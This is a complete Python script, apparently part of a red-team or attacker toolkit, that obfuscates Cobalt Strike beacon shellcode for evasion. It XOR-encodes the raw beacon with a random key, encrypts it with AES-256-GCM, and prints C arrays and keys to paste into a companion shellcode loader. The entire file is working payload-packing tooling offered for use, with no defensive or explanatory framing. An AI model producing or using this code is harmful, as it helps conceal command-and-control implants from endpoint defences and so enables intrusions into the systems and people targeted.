#!/usr/bin/env python3
"""
Simple XOR Obfuscator for Cobalt Strike Beacons
This version is tested and verified to work
"""

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import sys

def xor_encode(data, key_byte):
    return bytes([b ^ key_byte for b in data])

def encrypt_aes_gcm(plaintext, aes_key):
    iv = get_random_bytes(12)
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return iv, ciphertext, tag

def format_c_array(data, name="data"):
    result = f'unsigned char {name}[] = \n"'
    for i, byte in enumerate(data):
        result += f"\\x{byte:02x}"
        if (i + 1) % 16 == 0 and i != len(data) - 1:
            result += '"\n"'
    result += '";\n'
    return result

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 simple_xor_obfuscator.py beacon.bin")
        sys.exit(1)
    
    beacon_file = sys.argv[1]
    
    print("=" * 70)
    print("  SIMPLE XOR OBFUSCATOR FOR COBALT STRIKE")
    print("=" * 70)
    print()
    
    with open(beacon_file, 'rb') as f:
        original_beacon = f.read()
    
    print(f"[*] Original beacon: {len(original_beacon)} bytes")
    print(f"[*] First 16 bytes (original): ", end="")
    for b in original_beacon[:16]:
        print(f"{b:02x} ", end="")
    print("\n")
    
    xor_key = get_random_bytes(1)[0]
    print(f"[*] Generated XOR key: 0x{xor_key:02x}")
    
    xored_beacon = xor_encode(original_beacon, xor_key)
    print(f"[+] XOR encoding complete")
    print(f"[*] First 16 bytes (XOR'd):    ", end="")
    for b in xored_beacon[:16]:
        print(f"{b:02x} ", end="")
    print("\n")
    
    decoded_test = xor_encode(xored_beacon, xor_key)
    if decoded_test == original_beacon:
        print("[+] ✓ XOR round-trip verified: encode → decode = original")
    else:
        print("[-] ✗ XOR round-trip FAILED!")
        sys.exit(1)
    print()
    
    aes_key = get_random_bytes(32)
    aes_key_hex = aes_key.hex()
    print(f"[*] AES-256 key: {aes_key_hex}")
    print()
    
    print("[*] Encrypting with AES-256-GCM...")
    iv, ciphertext, tag = encrypt_aes_gcm(xored_beacon, aes_key)
    
    combined = iv + ciphertext + tag
    
    print(f"[+] Encryption complete")
    print(f"    IV: {len(iv)} bytes")
    print(f"    Ciphertext: {len(ciphertext)} bytes")
    print(f"    Tag: {len(tag)} bytes")
    print(f"    Total: {len(combined)} bytes")
    print()
    
    config_file = beacon_file.replace('.bin', '_xor_config.txt')
    with open(config_file, 'w') as f:
        f.write("// XOR + AES-GCM CONFIGURATION\n")
        f.write("// Copy these into your loader:\n\n")
        f.write(f"#define XOR_KEY 0x{xor_key:02x}\n\n")
        f.write(format_c_array(combined, "shellcode_encrypted"))
        f.write(f'\nconst char* keyHex = "{aes_key_hex}";\n')
    
    print(f"[+] Configuration saved to: {config_file}")
    print()
    
    print("=" * 70)
    print("  COPY THIS INTO YOUR LOADER:")
    print("=" * 70)
    print()
    print(f"#define XOR_KEY 0x{xor_key:02x}")
    print()
    print(format_c_array(combined, "shellcode_encrypted"))
    print()
    print(f'const char* keyHex = "{aes_key_hex}";')
    print()
    print("=" * 70)
    print()
    
    print("[*] Verification:")
    print(f"    Original starts with: fc 48 83 e4 f0 ...")
    print(f"    XOR'd starts with:    {xored_beacon[0]:02x} {xored_beacon[1]:02x} {xored_beacon[2]:02x} {xored_beacon[3]:02x} {xored_beacon[4]:02x} ...")
    print(f"    After AES: (encrypted, unreadable)")
    print(f"    Loader will: AES decrypt → XOR decode → fc 48 83 e4 f0 ...")
    print()
    print("[+] Done! Use simple_xor_loader.c")

if __name__ == "__main__":
    main()
